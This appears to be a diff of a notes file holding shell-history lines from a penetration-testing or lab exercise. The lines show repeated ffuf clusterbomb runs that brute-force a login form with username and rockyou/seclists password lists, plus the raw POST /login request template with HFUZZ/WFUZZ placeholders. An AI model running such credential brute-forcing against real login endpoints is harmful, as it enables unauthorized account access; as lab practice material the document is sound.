@@ -2,18 +2,23 @@
 
 
 #############################################
+
 #############################################
 
  2099  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -v
+ 
  2101  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -fc 401 -v
 
  2106  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -fc 401 -v
+ 
  2107  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200
+ 
  2108  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302
+ 
  2109  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302,300
 
  2113  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -mc 200,301,302,300
- 2114  history
+
 
 
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -58,6 +63,7 @@ ________________________________________________
 
 ffuf -c -request request.txt -request-proto http -mode clusterbomb -w DONE:HFUZZ -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt:WFUZZ -mc 200,301,302 -v
 
+
 POST /login HTTP/1.1
 Host: interface
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -71,6 +77,7 @@ Connection: close
 Referer: http://a;sldfnaskdf;nalskdfnafd
 
 {"username":"HFUZZ","password":"WFUZZ"}
+
 
 
 #############################################
